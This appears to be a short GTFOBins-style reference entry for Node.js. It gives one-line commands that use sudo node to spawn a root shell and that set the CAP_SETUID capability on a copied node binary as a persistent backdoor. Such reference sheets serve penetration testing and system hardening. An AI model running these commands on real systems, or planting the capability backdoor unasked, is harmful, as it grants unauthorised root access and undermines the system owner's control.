***** Sudo *****
It runs in privileged context and may be used to access the file system,
escalate or maintain access with elevated privileges if enabled on sudo.
    * sudo node -e 'require("child_process").spawn("/bin/sh", {stdio: [0, 1,
      2]});'
***** Capabilities *****
It can manipulate its process UID and can be used on Linux as a backdoor to
maintain elevated privileges with the CAP_SETUID capability set. This also
works when executed by another binary with the capability set.
    * cp $(which node) .
      sudo setcap cap_setuid+ep node

      ./node -e 'process.setuid(0); require("child_process").spawn("/bin/sh",
      {stdio: [0, 1, 2]});'
